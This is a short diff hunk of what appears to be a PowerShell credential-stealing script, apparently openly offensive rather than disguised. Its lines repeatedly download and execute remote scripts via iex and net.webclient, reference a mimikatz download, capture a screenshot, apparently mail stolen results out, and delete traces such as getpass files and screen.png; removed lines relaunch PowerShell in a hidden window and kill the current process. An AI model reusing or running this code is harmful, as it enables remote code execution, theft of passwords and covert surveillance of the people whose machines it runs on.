@@ -10,12 +10,6 @@ iex((new-object net.webclient).downloadstring($command))
 #(new-object net.webclient).downloadstring($mimikatz) > e:\mimikatz.ps1
 iex((new-object net.webclient).downloadstring($screenshot))
 iex((new-object net.webclient).downloadstring($sendmail))
-#stop-process -name powershell
-#iex((new-object net.webclient).downloadstring($end))
-#sleep -s 5
-rm e:\getpass.*
-start-process powershell -windowstyle hidden
-stop-process $pid
 rm e:\getpass.*
 rm e:\screen.png
 
